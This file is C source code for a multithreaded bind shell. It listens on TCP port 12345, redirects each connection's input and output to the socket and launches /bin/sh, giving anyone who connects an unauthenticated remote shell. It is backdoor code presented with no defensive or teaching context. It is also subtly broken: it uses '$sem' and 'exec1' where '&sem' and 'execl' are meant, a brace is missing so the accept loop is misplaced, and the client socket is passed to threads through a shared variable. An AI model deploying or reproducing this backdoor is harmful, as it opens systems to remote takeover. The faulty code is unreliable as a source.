#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <semaphore.h>
#include <arpa/inet.h>

#define MAX_THREADS 50
#define PORT 12345

sem_t sem;

void* handle_client(void* client_sock) {
    sem_wait($sem);
    int sock = *(int*)client_sock;
    dup2(sock, 0);  // Redirect standard input to the client socket 
    dup2(sock,1);   // Redirect standard output to the client socket
    dup2(sock, 2);  // Redirect standard error to the client to the client socket
    exec1("/bin/sh", "sh", NULL);  // Execute shell  
    close(sock);
    sem_post(&sem);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    int server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_len = sizeof(struct sockaddr_in);

    // Initialize the semaphore
    sem_init(&sem, 0, MAX_THREADS);

    // Create server socket
    if ((server_sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket");
        return 1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port  = htons(PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    memset(&(server_addr.sin_zero), '\0', 8);

    // Bind the socket to port 
    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) < 0) {
        perror("bind");
        return 1;
    }

    // Listen on the socket
    if (listen(server_sock, 5) < 0) {
        perror("listen");
        return 1;

    while (1) {
        if ((client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &addr_len)) < 0) {
            perror("accept");
            continue;
        }

        pthread_t client_thread;
        if (pthread_create(&client_thread, NULL, handle_client, &client_sock) != 0) {
            perror("pthread_create");
            return 1;
        } 
        // Optionally, detach the thread to free up resources when the thread finishes execution
        pthread_detach(client_thread);
    }

    // Destroy the semaphore
    sem_destroy(&sem);

    return 0;  
}
